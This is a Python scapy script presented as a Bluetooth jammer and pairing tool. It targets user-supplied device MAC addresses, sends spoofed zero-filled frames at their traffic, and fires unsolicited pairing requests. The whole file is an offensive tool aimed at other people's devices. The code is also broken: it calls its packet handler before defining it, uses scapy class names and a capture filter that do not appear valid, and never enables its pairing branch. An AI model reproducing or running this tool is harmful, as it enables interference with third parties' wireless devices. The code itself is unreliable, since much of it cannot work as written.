from scapy.all import *
from scapy.layers.bluetooth import *
import argparse
import logging

logging.basicConfig(filename='bluetooth_jammer.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

parser = argparse.ArgumentParser(description='Bluetooth Jammer and Pairing Tool')
parser.add_argument('-t', '--targets', required=True, help='Target device MAC addresses (comma-separated)')
parser.add_argument('-c', '--custom-packets', action='store_true', help='Enable custom packet crafting')
args = parser.parse_args()

target_macs = args.targets.split(',')


target_devices = []
for mac in target_macs:
    target_devices.append({
        'mac': mac.strip(),
        'jamming': False,
        'pairing': False
    })

def craft_custom_packet(pkt):
    return BTLEFrame(
        btle=BTLEHeader(
            access_addr=pkt[BLE].access_addr,
            crc=pkt[BLE].crc,
            pdu_type=pkt[BLE].pdu_type,
            llid=pkt[BLE].llid,
            payload_len=pkt[BLE].payload_len
        ),
        data=b'\x00' * pkt[BLE].payload_len
    )

def jam_packets(pkt):
    try:
        for device in target_devices:
            if pkt[BLE].addr == device['mac']:
                device['jamming'] = True
                logging.info(f"Jamming packet from {device['mac']}")

                if args.custom_packets:
                    spoofed_pkt = craft_custom_packet(pkt)
                else:
                    spoofed_pkt = BTLEFrame(
                        btle=BTLEHeader(
                            access_addr=pkt[BLE].access_addr,
                            crc=pkt[BLE].crc,
                            pdu_type=pkt[BLE].pdu_type,
                            llid=pkt[BLE].llid,
                            payload_len=pkt[BLE].payload_len
                        ),
                        data=b'\x00' * pkt[BLE].payload_len
                    )
                  
                send(spoofed_pkt)
                break
    except Exception as e:
        logging.error(f"Error jamming packet: {e}")

def pair_with_device(pkt):
    try:
        if pkt[BTLEAdv].adv_type == 0x03:
            for device in target_devices:
                if device['pairing']:
                    pairing_req = BTLEPairingRequest(
                        io_capability=0x03,
                        oob_data_flag=0x00,
                        auth_req=0x01,
                        max_key_size=0x10,
                        init_key_dist=0x07,
                        resp_key_dist=0x07
                    )
                    send(pairing_req)
                    device['pairing'] = False
                    logging.info(f"Paired with {device['mac']}")
    except Exception as e:
        logging.error(f"Error pairing with device: {e}")
sniff(filter="bt", prn=lambda x: process_packet(x))

def process_packet(pkt):
    if pkt.haslayer(BTLEFrame):
        jam_packets(pkt)
    elif pkt.haslayer(BTLEAdv):
        pair_with_device(pkt)

while True:
    try:
        new_targets = input("Enter new target MAC addresses (comma-separated): ")
        if new_targets:
            for mac in new_targets.split(','):
                target_devices.append({
                    'mac': mac.strip(),
                    'jamming': False,
                    'pairing': False
                })
    except KeyboardInterrupt:
        logging.info("Exiting...")
        break
    except Exception as e:
        logging.error(f"Error in main loop: {e}")
